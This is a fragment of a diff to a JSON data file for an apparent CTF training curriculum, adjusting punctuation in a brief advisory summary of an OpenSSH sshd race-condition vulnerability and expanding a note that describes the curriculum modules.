-      "summary": "A signal handler race condition in OpenSSH server (sshd) allows unauthenticated remote code execution as root on glibc-based Linux systems. Affects OpenSSH < 4.4p1 and 8.5p1-9.7p1.",
+      "summary": "A signal handler race condition in OpenSSH server (sshd) allows unauthenticated remote code execution as root on glibc-based Linux systems. Affects OpenSSH < 4.4p1 and 8.5p1–9.7p1.",
       "date": "2024-07-01T00:00:00.000Z",
       "severity": "exploited",
       "topic": "binary exploitation",
@@ -829,7 +944,7 @@
   ],
   "notes": [
     "Curriculum data is curated by the CTF Atlas team and covers six core exploitation domains.",
-    "Each curriculum module includes textbook-grade theory, tool deep-dives, case studies, and interactive terminal challenges.",
+    "Each curriculum module includes textbook-grade theory, tool deep-dives with CLI & GUI workflows, defensive impact, case studies, and interactive terminal challenges.",
     "Intelligence items are discovery signals from CISA KEV and NVD. They inform curriculum priority but do not replace curated lessons."
   ]
 }
